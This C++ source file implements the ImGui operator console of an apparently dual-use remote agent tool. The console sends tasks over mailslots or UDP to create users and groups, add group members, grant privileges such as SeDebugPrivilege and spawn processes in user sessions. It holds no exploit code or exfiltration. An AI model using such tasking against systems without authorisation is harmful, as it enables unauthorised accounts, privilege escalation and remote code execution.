#include "pch.h"
#include "Application.h"

namespace MainApp {
	static bool opt_fullscreen = true;
	static bool opt_padding    = false;
	static ImGuiDockNodeFlags dockspace_flags = ImGuiDockNodeFlags_None;

	// Logger plugin instance
	std::vector<Obligato::LogLine> _logsdb;
	static bool _showDebugLogs  = false;
	static bool _showTraceLogs  = false;
	static bool _showErrorLogs  = true;
	static bool _showExceptLogs = true;
	static bool _showWarnLogs   = true;
	static bool _showInfoLogs   = true;
	std::shared_ptr<Obligato::Logger> logger = std::make_shared<Obligato::Logger>();

	// Listeners data
	ObClient::ListenersDb _listenersdb;
	std::shared_ptr<Obligato::Listeners> _listeners = std::make_shared<Obligato::Listeners>(logger);

	// Targets data
	ObClient::TargetsDb _targetsdb;
	ObEngine::TransType _targetTransport = ObEngine::TransType::None;
	std::string _targetNetBIOS  = "";
	std::string _targetMailslot = "";
	std::string _targetAddress  = "";
	int _targetPort = 0;
	std::shared_ptr<Obligato::Targets> _targets = std::make_shared<Obligato::Targets>(logger);

	// TaskAgents data
	std::string _taskAgentNavTarget   = "";
	std::string _taskAgentNavListener = "";
	std::string _taskAgentNavTask     = "";
	
	int _taskParamUdpPort           = 0;
	std::string _taskParamUdpAddr   = "";
	std::string _taskParamMailslot  = "";
	std::string _taskParamNetBIOS   = "";
	std::string _taskParamMessage   = "";
	std::string _taskParamDomain    = "";
	std::string _taskParamUsername  = "";
	std::string _taskParamPassword  = "";
	std::string _taskParamGroup     = "";
	std::string _taskParamComment   = "";
	std::string _taskParamMember    = "";
	std::string _taskParamEntity    = "";
	std::string _taskParamPrivilege = "";
	std::string _taskParamAppName   = "";
	std::string _taskParamAppArgs   = "";
	std::string _taskParamAppCwd    = "";

	ObClient::AgentTaskMap _taskMap = {
		{ObEngineRef::MessageType::AddMailslotNotify,     "Add mailslot notification route"},
		{ObEngineRef::MessageType::RemoveMailslotNotify,  "Remove mailslot notification route"},
		{ObEngineRef::MessageType::MailslotNotify,        "Send notification via mailslot"},
		{ObEngineRef::MessageType::AddUdpSocketNotify,    "Add UDP socket notification route"},
		{ObEngineRef::MessageType::RemoveUdpSocketNotify, "Remove UDP socket notification route"},
		{ObEngineRef::MessageType::UdpSocketNotify,       "Send notification via UDP socket"},
		{ObEngineRef::MessageType::CreateUser,            "Create local user"},
		{ObEngineRef::MessageType::DeleteUser,            "Delete local user"},
		{ObEngineRef::MessageType::CreateGroup,           "Create local group"},
		{ObEngineRef::MessageType::DeleteGroup,           "Delete local group"},
		{ObEngineRef::MessageType::AddGroupMember,        "Add member to local group"},
		{ObEngineRef::MessageType::RemoveGroupMember,     "Remove member from local group"},
		{ObEngineRef::MessageType::AddPrivilege,          "Add privilege to local user or group"},
		{ObEngineRef::MessageType::RemovePrivilege,       "Remove privilege from local user or group"},
		//{ObEngineRef::MessageType::EnumProcesses,         "(TODO) Enumerate running processes"},
		{ObEngineRef::MessageType::SpawnProcess,          "Spawn a process in a user session"}
		//{ObEngineRef::MessageType::KillProcess,           "(TODO) Kill running process"},
		//{ObEngineRef::MessageType::ManageService,         "(TODO) Create/Modify/Delete service"},
		//{ObEngineRef::MessageType::ManageSchTask,         "(TODO) Create/Modify/Delete scheduled task"},
		//{ObEngineRef::MessageType::DownloadFile,          "(TODO) Download file"},
		//{ObEngineRef::MessageType::UploadFile,            "(TODO) Upload file"}
	};

	void RenderUI() {
		/*
			We are using the ImGuiWindowFlags_NoDocking flag to make the
			parent window not dockable into, because it would be
			confusing to have two docking targets within each others.
		*/
		ImGuiWindowFlags window_flags = ImGuiWindowFlags_MenuBar | ImGuiWindowFlags_NoDocking;

		if (opt_fullscreen)
		{
			const ImGuiViewport* viewport = ImGui::GetMainViewport();
			ImGui::SetNextWindowPos(viewport->WorkPos);
			ImGui::SetNextWindowSize(viewport->WorkSize);
			ImGui::SetNextWindowViewport(viewport->ID);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			window_flags |= ImGuiWindowFlags_NoTitleBar
				| ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize
				| ImGuiWindowFlags_NoMove;
			window_flags |= ImGuiWindowFlags_NoBringToFrontOnFocus
				| ImGuiWindowFlags_NoNavFocus;
		}
		else
		{
			dockspace_flags &= ~ImGuiDockNodeFlags_PassthruCentralNode;
		}

		/*
			When using ImGuiDockNodeFlags_PassthruCentralNode,
			DockSpace() will render our background and handle the
			pass-thru hole, so we ask Begin() to not render a background.
		*/
		if (dockspace_flags & ImGuiDockNodeFlags_PassthruCentralNode)
			window_flags |= ImGuiWindowFlags_NoBackground;

		/*
			[Important] note that we proceed even if Begin() returns
			false (aka window is collapsed). This is because we want to
			keep our DockSpace() active. If a DockSpace() is inactive,
			all active windows docked into it will lose their parent
			and become undocked. We cannot preserve the docking
			relationship between an active window and an inactive
			docking, otherwise any change of dockspace/settings would
			lead to windows being stuck in limbo and never being visible.
		*/
		if (!opt_padding)
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));

		ImGui::Begin("DockSpace", nullptr, window_flags);
		if (!opt_padding)
			ImGui::PopStyleVar();

		if (opt_fullscreen)
			ImGui::PopStyleVar(2);

		// Submit the DockSpace
		ImGuiIO& io = ImGui::GetIO();
		if (io.ConfigFlags & ImGuiConfigFlags_DockingEnable)
		{
			ImGuiID dockspace_id = ImGui::GetID("MyDockSpace");
			ImGui::DockSpace(dockspace_id, ImVec2(0.0f, 0.0f), dockspace_flags);
		}

		/*
			MENU BAR
		*/
		if (ImGui::BeginMenuBar())
		{
			//OptionsMenu();
			ImGui::EndMenuBar();
		}

		
		/*
			WINDOWS
		*/
		LoggerWindow();
		ListenersWindow();
		TargetsWindow();
		TaskAgentsWindow();


		// End Dockspace
		ImGui::End();
	}

	
	/*
		GUI ELEMENTS
	*/
	void LoggerWindow() {
		ImGui::Begin("Logs");
		static char str1[512] = "";

		// Top section
		{
			if (ImGui::Button("Clear")) {
				logger->ClearLogs();
				str1[0] = '\0';
			}

			ImGui::SameLine();
			ImGui::Checkbox("Debug", &_showDebugLogs);

			ImGui::SameLine();
			ImGui::Checkbox("Trace", &_showTraceLogs);

			ImGui::SameLine();
			ImGui::Checkbox("Error", &_showErrorLogs);

			ImGui::SameLine();
			ImGui::Checkbox("Exception", &_showExceptLogs);

			ImGui::SameLine();
			ImGui::Checkbox("Warning", &_showWarnLogs);

			ImGui::SameLine();
			ImGui::Checkbox("Info", &_showInfoLogs);
		}

		ImGui::Separator();

		{
			ImGuiWindowFlags window_flags = ImGuiWindowFlags_HorizontalScrollbar;
			ImGui::BeginChild(
				"LogsDisplay",
				ImVec2(
					ImGui::GetContentRegionAvail().x,
					ImGui::GetContentRegionAvail().y * 0.95f
				),
				false,
				window_flags
			);

			logger->GetLogSnapshot(_logsdb);

			for (auto i = 0; i < _logsdb.size(); i++) {
				bool bShowLog = false;

				if ((_logsdb[i].Prefix == "[Debug]") && (_showDebugLogs == true)) {
					bShowLog = true;
				}
				else if ((_logsdb[i].Prefix == "[Trace]") && (_showTraceLogs == true)) {
					bShowLog = true;
				}
				else if ((_logsdb[i].Prefix == "[Error]") && (_showErrorLogs == true)) {
					bShowLog = true;
				}
				else if ((_logsdb[i].Prefix == "[Exception]") && (_showExceptLogs == true)) {
					bShowLog = true;
				}
				else if ((_logsdb[i].Prefix == "[Warn]") && (_showWarnLogs == true)) {
					bShowLog = true;
				}
				else if ((_logsdb[i].Prefix == "[Info]") && (_showInfoLogs == true)) {
					bShowLog = true;
				}

				if (bShowLog == true) {
					if (_logsdb[i].PrefixColor != Obligato::LogColor::None) {
						ImVec4 color;
						logger->LookupColor(_logsdb[i].PrefixColor, color);
						ImGui::PushStyleColor(ImGuiCol_Text, color);
						ImGui::Text(_logsdb[i].Prefix.c_str());
						ImGui::PopStyleColor();
					}
					else {
						ImGui::Text(_logsdb[i].Prefix.c_str());
					}

					ImGui::SameLine();

					if (_logsdb[i].TextColor != Obligato::LogColor::None) {
						ImVec4 color;
						logger->LookupColor(_logsdb[i].TextColor, color);
						ImGui::PushStyleColor(ImGuiCol_Text, color);
						ImGui::Text(_logsdb[i].Text.c_str());
						ImGui::PopStyleColor();
					}
					else {
						ImGui::Text(_logsdb[i].Text.c_str());
					}
				}
			}

			ImGui::EndChild();
		}

		ImGui::End();
	}
	
	void ListenersWindow() {
		return;
	}
	
	void TargetsWindow() {
		ImGui::Begin("Targets");
		
		std::string logline = "";
		
		// Top Section
		{
			ImGuiInputTextFlags input_flags       = ImGuiInputTextFlags_EnterReturnsTrue;
			ImGuiInputTextFlags input_upper_flags = input_flags | ImGuiInputTextFlags_CharsUppercase;

			// Add targets
			static int e = 0;
			ImGui::RadioButton("Mailslot", &e, 0); ImGui::SameLine();
			ImGui::RadioButton("UDP Socket", &e, 1);

			if (e == 0) {
				_targetTransport = ObEngine::TransType::Mailslot;
				ImGui::InputTextWithHint("NetBIOS", "", &_targetNetBIOS, input_upper_flags);
				ImGui::InputTextWithHint("Mailslot", "", &_targetMailslot, input_flags);
			}
			else if (e == 1) {
				_targetTransport = ObEngine::TransType::UdpSocket;
				ImGui::InputTextWithHint("Address", "", &_targetAddress, input_flags);
				ImGui::InputInt("Port", &_targetPort, input_flags);
			}

			if (ImGui::Button("Add")) {
				if (_targetTransport == ObEngine::TransType::Mailslot) {
					// Add mailslot target to database
					if (_targetNetBIOS.empty())
						logger->Error("Target NetBIOS must be specified.");
					else if (_targetMailslot.empty())
						logger->Error("Mailslot musst be specified.");
					else {
						_targets->AddMailslotTarget(Obligato::s2ws(_targetMailslot), Obligato::s2ws(_targetNetBIOS));
						_targetMailslot.clear();
						_targetNetBIOS.clear();
						_targets->GetTargetsDbSnapshot(_targetsdb);
					}
				}
				else if (_targetTransport == ObEngine::TransType::UdpSocket) {
					// Add UDP socket target to database
					USHORT dstUdpPort = 0;
				
					if (::IntToUShort(_targetPort, &dstUdpPort) != S_OK) {
						logger->Error(std::format("Port '{}' is invalid.", _targetPort));
					}
					else {
						if (_targetAddress.empty())
							logger->Error("Target must be specified.");
						else if (dstUdpPort > 65535)
							logger->Error("Port must be <= 65535.");
						else {
							_targets->AddUdpSocketTarget(Obligato::s2ws(_targetAddress), dstUdpPort);
							_targetAddress.clear();
							_targetPort = 0;
							_targets->GetTargetsDbSnapshot(_targetsdb);
						}
					}
				}
			}
		}

		ImGui::Separator();

		// Targets Table Section
		{
			static ImGuiWindowFlags window_flags = ImGuiWindowFlags_HorizontalScrollbar;

			ImGui::BeginChild(
				"TargetsTableWindow",
				ImVec2(
					ImGui::GetContentRegionAvail().x,
					ImGui::GetContentRegionAvail().y
				),
				false,
				window_flags
			);

			static ImGuiTableFlags table_flags = ImGuiTableFlags_BordersInnerV | ImGuiTableFlags_RowBg |
				ImGuiTableFlags_ScrollY | ImGuiTableFlags_Resizable |
				ImGuiTableFlags_Hideable | ImGuiTableFlags_Reorderable;

			DWORD numColumns = 2;
			if (ImGui::BeginTable("TargetsTable", numColumns, table_flags)) {
				ImGui::TableSetupScrollFreeze(0, 1); // Make top row (headers) always visible
				ImGui::TableSetupColumn("UID");
				ImGui::TableSetupColumn("URI");
				ImGui::TableHeadersRow();

				for (DWORD row = 0; row < _targetsdb.size(); row++) {
					std::string uid = std::format("{}", std::any_cast<size_t>(_targetsdb[row][L"uid"]));
					std::string uri = Obligato::ws2s(std::any_cast<std::wstring>(_targetsdb[row][L"uri"]));

					ImGui::PushID(row);
					ImGui::TableNextRow();

					// UID
					ImGui::TableNextColumn();
					ImGui::Text(uid.c_str());

					// URI
					ImGui::TableNextColumn();
					ImGui::Text(uri.c_str());

					ImGui::PopID();
				}
				ImGui::EndTable();
			}
			ImGui::EndChild();
		}
		
		ImGui::End();
	}

	void TaskAgentsWindow() {
		ImGui::Begin("TaskAgents");

		std::string logline = "";

		// Target selection dropdown
		static size_t targets_select_idx = 0;
		{
			if (ImGui::BeginCombo("##Targets Combo", _taskAgentNavTarget.c_str())) {
				for (size_t i = 0; i < _targetsdb.size(); i++) {
					std::string uri = Obligato::ws2s(std::any_cast<std::wstring>(_targetsdb[i][L"uri"]));

					const bool is_selected = (targets_select_idx == i);
					if (ImGui::Selectable(uri.c_str(), is_selected)) {
						targets_select_idx = i;
						_taskAgentNavTarget = uri;
					}

					if (is_selected)
						ImGui::SetItemDefaultFocus();
				}
				ImGui::EndCombo();
			}

			ImGui::SameLine();
			ImGui::Text("Target");
		}

		// Listener selection dropdown
		static size_t listeners_select_idx = 0;
		{
			if (ImGui::BeginCombo("##Listeners Combo", _taskAgentNavListener.c_str())) {
				for (size_t i = 0; i < _listenersdb.size(); i++) {
					std::string uri = Obligato::ws2s(std::any_cast<std::wstring>(_listenersdb[i][L"uri"]));

					const bool is_selected = (listeners_select_idx == i);
					if (ImGui::Selectable(uri.c_str(), is_selected)) {
						listeners_select_idx = i;
						_taskAgentNavListener = uri;
					}

					if (is_selected)
						ImGui::SetItemDefaultFocus();
				}
				ImGui::EndCombo();
			}

			ImGui::SameLine();
			ImGui::Text("Listener");
		}

		// Task selection dropdown
		static ObEngineRef::MessageType tasks_select_idx = ObEngineRef::MessageType::None;
		{
			if (ImGui::BeginCombo("##Tasks Combo", _taskAgentNavTask.c_str())) {
				for (auto i = _taskMap.begin(); i != _taskMap.end(); i++) {
					std::string taskHint = _taskMap[i->first];

					const bool is_selected = (tasks_select_idx == i->first);
					if (ImGui::Selectable(taskHint.c_str(), is_selected)) {
						tasks_select_idx = i->first;
						_taskAgentNavTask = taskHint;
					}

					if (is_selected)
						ImGui::SetItemDefaultFocus();
				}
				ImGui::EndCombo();
			}

			ImGui::SameLine();
			ImGui::Text("Task");
		}

		ImGui::Separator();

		// Task parameters, influenced by task selection
		{
			ImGuiInputTextFlags input_flags       = ImGuiInputTextFlags_EnterReturnsTrue;
			ImGuiInputTextFlags input_upper_flags = input_flags | ImGuiInputTextFlags_CharsUppercase;

			// This switch generates a UI form based on the selected task
			switch (tasks_select_idx) {
			case ObEngineRef::MessageType::AddMailslotNotify: {
				ImGui::InputTextWithHint("NetBIOS", "NetBIOS name for route destination", &_taskParamNetBIOS, input_upper_flags);
				ImGui::InputTextWithHint("Mailslot", "Mailslot for route destination", &_taskParamMailslot, input_flags);
				
				break;
			}
			case ObEngineRef::MessageType::RemoveMailslotNotify: {
				ImGui::InputTextWithHint("NetBIOS", "NetBIOS name of route destination", &_taskParamNetBIOS, input_upper_flags);
				ImGui::InputTextWithHint("Mailslot", "Mailslot of route destination", &_taskParamMailslot, input_flags);

				break;
			}
			case ObEngineRef::MessageType::MailslotNotify: {
				ImGui::InputTextWithHint("NetBIOS", "NetBIOS name of recipient", &_taskParamNetBIOS, input_upper_flags);
				ImGui::InputTextWithHint("Mailslot", "Mailslot of recipient", &_taskParamMailslot, input_flags);
				ImGui::InputTextWithHint("Notification", "Message for the recipient", &_taskParamMessage, input_flags);
				
				break;
			}
			case ObEngineRef::MessageType::AddUdpSocketNotify: {
				ImGui::InputTextWithHint("Address", "IP address for route destination", &_taskParamUdpAddr, input_flags);
				ImGui::InputInt("Port", &_taskParamUdpPort, input_flags);

				break;
			}
			case ObEngineRef::MessageType::RemoveUdpSocketNotify: {
				ImGui::InputTextWithHint("Address", "IP address of route destination", &_taskParamUdpAddr, input_flags);
				ImGui::InputInt("Port", &_taskParamUdpPort, input_flags);

				break;
			}
			case ObEngineRef::MessageType::UdpSocketNotify: {
				ImGui::InputTextWithHint("Address", "IP address of recipient", &_taskParamUdpAddr, input_flags);
				ImGui::InputInt("Port", &_taskParamUdpPort, input_flags);
				ImGui::InputTextWithHint("Notification", "Message for the recipient", &_taskParamMessage, input_flags);
				
				break;
			}
			case ObEngineRef::MessageType::CreateUser: {
				// TODO: Only local is supported currently, domain is ignored
				ImGui::InputTextWithHint("Domain", "(TODO) currently ignored; local only", &_taskParamDomain, input_flags);
				ImGui::InputTextWithHint("Username", "Username to create on target", &_taskParamUsername, input_flags);
				ImGui::InputTextWithHint("Password", "Password for created account", &_taskParamPassword, input_flags);

				break;
			}
			case ObEngineRef::MessageType::DeleteUser: {
				// TODO: Only local is supported currently, domain is ignored
				ImGui::InputTextWithHint("Domain", "(TODO) currently ignored; local only", &_taskParamDomain, input_flags);
				ImGui::InputTextWithHint("Username", "Username to delete on target", &_taskParamUsername, input_flags);

				break;
			}
			case ObEngineRef::MessageType::CreateGroup: {
				// TODO: Only local is supported currently, domain is ignored
				ImGui::InputTextWithHint("Domain", "(TODO) currently ignored; local only", &_taskParamDomain, input_flags);
				ImGui::InputTextWithHint("Group", "Group to create on target", &_taskParamGroup, input_flags);
				ImGui::InputTextWithHint("Comment", "Optional comment for group", &_taskParamComment, input_flags);

				break;
			}
			case ObEngineRef::MessageType::DeleteGroup: {
				// TODO: Only local is supported currently, domain is ignored
				ImGui::InputTextWithHint("Domain", "(TODO) currently ignored; local only", &_taskParamDomain, input_flags);
				ImGui::InputTextWithHint("Group", "Group to delete on target", &_taskParamGroup, input_flags);

				break;
			}
			case ObEngineRef::MessageType::AddGroupMember: {
				// TODO: Only local is supported currently, domain is ignored
				ImGui::InputTextWithHint("Domain", "(TODO) currently ignored; local only", &_taskParamDomain, input_flags);
				ImGui::InputTextWithHint("Group", "Group to add a member", &_taskParamGroup, input_flags);
				ImGui::InputTextWithHint("Member", "Group or user to add", &_taskParamMember, input_flags);

				break;
			}
			case ObEngineRef::MessageType::RemoveGroupMember: {
				// TODO: Only local is supported currently, domain is ignored
				ImGui::InputTextWithHint("Domain", "(TODO) currently ignored; local only", &_taskParamDomain, input_flags);
				ImGui::InputTextWithHint("Group", "Group to remove a member", &_taskParamGroup, input_flags);
				ImGui::InputTextWithHint("Member", "Group or user to remove", &_taskParamMember, input_flags);

				break;
			}
			case ObEngineRef::MessageType::AddPrivilege: {
				ImGui::InputTextWithHint("Entity", "Group or user to add privilege", &_taskParamEntity, input_flags);
				ImGui::InputTextWithHint("Privilege", "Privilege to add (i.e. SeDebugPrivilege)", &_taskParamPrivilege, input_flags);

				break;
			}
			case ObEngineRef::MessageType::RemovePrivilege: {
				ImGui::InputTextWithHint("Entity", "Group or user to remove privilege", &_taskParamEntity, input_flags);
				ImGui::InputTextWithHint("Privilege", "Privilege to remove (i.e. SeDebugPrivilege)", &_taskParamPrivilege, input_flags);

				break;
			}
			case ObEngineRef::MessageType::EnumProcesses: {
				break;
			}
			case ObEngineRef::MessageType::SpawnProcess: {
				ImGui::InputTextWithHint("Exe", "Executable (i.e. C:\\Windows\\System32\\cmd.exe)", &_taskParamAppName, input_flags);
				ImGui::InputTextWithHint("Args", "Arguments for the executable", &_taskParamAppArgs, input_flags);
				ImGui::InputTextWithHint("CWD", "Set current working directory for created process", &_taskParamAppCwd, input_flags);
				ImGui::InputTextWithHint("Domain", "Domain of target user session", &_taskParamDomain, input_flags);
				ImGui::InputTextWithHint("Username", "Username of target user session", &_taskParamUsername, input_flags);

				break;
			}
			case ObEngineRef::MessageType::KillProcess: {
				break;
			}
			case ObEngineRef::MessageType::ManageService: {
				break;
			}
			case ObEngineRef::MessageType::ManageSchTask: {
				break;
			}
			case ObEngineRef::MessageType::DownloadFile: {
				break;
			}
			case ObEngineRef::MessageType::UploadFile: {
				break;
			}
			default: {
				break;
			}
			}

			if (ImGui::Button("Execute")) {
				ObEngine::TransType transType = std::any_cast<ObEngine::TransType>(_targetsdb[targets_select_idx][L"transport"]);
				ObEngine::TransConf transConf;

				if (transType == ObEngine::TransType::Mailslot) {
					transConf[L"Slotname"] = std::any_cast<std::wstring>(_targetsdb[targets_select_idx][L"mailslot"]);
					transConf[L"NetBIOS"] = std::any_cast<std::wstring>(_targetsdb[targets_select_idx][L"netbios"]);
				}
				else if (transType == ObEngine::TransType::UdpSocket) {
					transConf[L"UdpAddr"] = std::any_cast<std::wstring>(_targetsdb[targets_select_idx][L"address"]);
					transConf[L"UdpPort"] = std::any_cast<USHORT>(_targetsdb[targets_select_idx][L"port"]);
				}

				// This switch executes the selected task
				switch (tasks_select_idx) {
				case ObEngineRef::MessageType::AddMailslotNotify: {
					std::wstring taskMailslot = Obligato::s2ws(_taskParamMailslot);
					std::wstring taskNetBIOS  = Obligato::s2ws(_taskParamNetBIOS);

					ObEngine::AddMailslotNotify(transType, transConf, taskMailslot, taskNetBIOS);

					logger->Info("AddMailslotNotify task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::RemoveMailslotNotify: {
					std::wstring taskMailslot = Obligato::s2ws(_taskParamMailslot);
					std::wstring taskNetBIOS = Obligato::s2ws(_taskParamNetBIOS);

					ObEngine::RemoveMailslotNotify(transType, transConf, taskMailslot, taskNetBIOS);
					
					logger->Info("RemoveMailslotNotify task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::MailslotNotify: {
					std::wstring taskMailslot = Obligato::s2ws(_taskParamMailslot);
					std::wstring taskNetBIOS = Obligato::s2ws(_taskParamNetBIOS);
					std::wstring taskMessage = Obligato::s2ws(_taskParamMessage);

					auto taskNotifyId = ObEngine::CalcMailslotNotifyId(taskMailslot, taskNetBIOS);
					ObEngine::SendMailslotNotify(transType, transConf, taskNotifyId, taskMessage);

					logger->Info("SendMailslotNotify task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::AddUdpSocketNotify: {
					USHORT usUdpPort = 0;

					if (::IntToUShort(_taskParamUdpPort, &usUdpPort) != S_OK) {
						logger->Error(std::format("Port '{}' is invalid.", _taskParamUdpPort));
						break;
					}

					std::wstring taskAddress = Obligato::s2ws(_taskParamUdpAddr);
					ObEngine::AddUdpSocketNotify(transType, transConf, taskAddress, usUdpPort);
					
					logger->Info("AddUdpSocketNotify task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::RemoveUdpSocketNotify: {
					USHORT usUdpPort = 0;

					if (::IntToUShort(_taskParamUdpPort, &usUdpPort) != S_OK) {
						logger->Error(std::format("Port '{}' is invalid.", _taskParamUdpPort));
						break;
					}

					std::wstring taskAddress = Obligato::s2ws(_taskParamUdpAddr);
					ObEngine::RemoveUdpSocketNotify(transType, transConf, taskAddress, usUdpPort);

					logger->Info("RemoveUdpSocketNotify task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::UdpSocketNotify: {
					USHORT usUdpPort = 0;

					if (::IntToUShort(_taskParamUdpPort, &usUdpPort) != S_OK) {
						logger->Error(std::format("Port '{}' is invalid.", _taskParamUdpPort));
						break;
					}

					std::wstring taskAddress = Obligato::s2ws(_taskParamUdpAddr);
					std::wstring taskMessage = Obligato::s2ws(_taskParamMessage);

					auto taskNotifyId = ObEngine::CalcUdpSocketNotifyId(taskAddress, usUdpPort);
					ObEngine::SendUdpSocketNotify(transType, transConf, taskNotifyId, taskMessage);

					logger->Info("SendUdpSocketNotify task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::CreateUser: {
					std::wstring taskDomain   = Obligato::s2ws(_taskParamDomain);
					std::wstring taskUsername = Obligato::s2ws(_taskParamUsername);
					std::wstring taskPassword = Obligato::s2ws(_taskParamPassword);

					ObEngine::CreateUserTask(transType, transConf, 0, taskDomain, taskUsername, taskPassword);
					_taskParamDomain.clear();
					_taskParamUsername.clear();
					_taskParamPassword.clear();

					logger->Info("CreateUserTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::DeleteUser: {
					std::wstring taskDomain   = Obligato::s2ws(_taskParamDomain);
					std::wstring taskUsername = Obligato::s2ws(_taskParamUsername);

					ObEngine::DeleteUserTask(transType, transConf, 0, taskDomain, taskUsername);
					_taskParamDomain.clear();
					_taskParamUsername.clear();

					logger->Info("DeleteUserTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::CreateGroup: {
					std::wstring taskDomain  = Obligato::s2ws(_taskParamDomain);
					std::wstring taskGroup   = Obligato::s2ws(_taskParamGroup);
					std::wstring taskComment = Obligato::s2ws(_taskParamComment);

					ObEngine::CreateGroupTask(transType, transConf, 0, taskDomain, taskGroup, taskComment);
					_taskParamDomain.clear();
					_taskParamGroup.clear();
					_taskParamComment.clear();

					logger->Info("CreateGroupTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::DeleteGroup: {
					std::wstring taskDomain = Obligato::s2ws(_taskParamDomain);
					std::wstring taskGroup  = Obligato::s2ws(_taskParamGroup);

					ObEngine::DeleteGroupTask(transType, transConf, 0, taskDomain, taskGroup);
					_taskParamDomain.clear();
					_taskParamGroup.clear();

					logger->Info("DeleteGroupTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::AddGroupMember: {
					std::wstring taskDomain = Obligato::s2ws(_taskParamDomain);
					std::wstring taskGroup  = Obligato::s2ws(_taskParamGroup);
					std::wstring taskMember = Obligato::s2ws(_taskParamMember);

					ObEngine::AddGroupMemberTask(transType, transConf, 0, taskDomain, taskGroup, taskMember);
					_taskParamDomain.clear();
					_taskParamGroup.clear();
					_taskParamMember.clear();

					logger->Info("AddGroupMemberTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::RemoveGroupMember: {
					std::wstring taskDomain = Obligato::s2ws(_taskParamDomain);
					std::wstring taskGroup = Obligato::s2ws(_taskParamGroup);
					std::wstring taskMember = Obligato::s2ws(_taskParamMember);

					ObEngine::RemoveGroupMemberTask(transType, transConf, 0, taskDomain, taskGroup, taskMember);
					_taskParamDomain.clear();
					_taskParamGroup.clear();
					_taskParamMember.clear();

					logger->Info("RemoveGroupMemberTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::AddPrivilege: {
					std::wstring taskEntity = Obligato::s2ws(_taskParamEntity);
					std::wstring taskPriv   = Obligato::s2ws(_taskParamPrivilege);

					ObEngine::AddPrivilegeTask(transType, transConf, 0, taskEntity, taskPriv);
					_taskParamEntity.clear();
					_taskParamPrivilege.clear();

					logger->Info("AddPrivilegeTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::RemovePrivilege: {
					std::wstring taskEntity = Obligato::s2ws(_taskParamEntity);
					std::wstring taskPriv = Obligato::s2ws(_taskParamPrivilege);

					ObEngine::RemovePrivilegeTask(transType, transConf, 0, taskEntity, taskPriv);
					_taskParamEntity.clear();
					_taskParamPrivilege.clear();

					logger->Info("RemovePrivilegeTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::EnumProcesses: {
					break;
				}
				case ObEngineRef::MessageType::SpawnProcess: {
					std::wstring taskAppName  = Obligato::s2ws(_taskParamAppName);
					std::wstring taskAppArgs  = Obligato::s2ws(_taskParamAppArgs);
					std::wstring taskAppCwd   = Obligato::s2ws(_taskParamAppCwd);
					std::wstring taskDomain   = Obligato::s2ws(_taskParamDomain);
					std::wstring taskUsername = Obligato::s2ws(_taskParamUsername);

					ObEngine::SpawnProcessTask(transType, transConf, 0, taskAppName, taskAppArgs,
						taskAppCwd, taskDomain, taskUsername);
					
					_taskParamDomain.clear();
					_taskParamUsername.clear();

					logger->Info("SpawnProcessTask task sent successfully");
					break;
				}
				case ObEngineRef::MessageType::KillProcess: {
					break;
				}
				case ObEngineRef::MessageType::ManageService: {
					break;
				}
				case ObEngineRef::MessageType::ManageSchTask: {
					break;
				}
				case ObEngineRef::MessageType::DownloadFile: {
					break;
				}
				case ObEngineRef::MessageType::UploadFile: {
					break;
				}
				default: {
					break;
				}
				}
			}
		}

		ImGui::End();
	}
}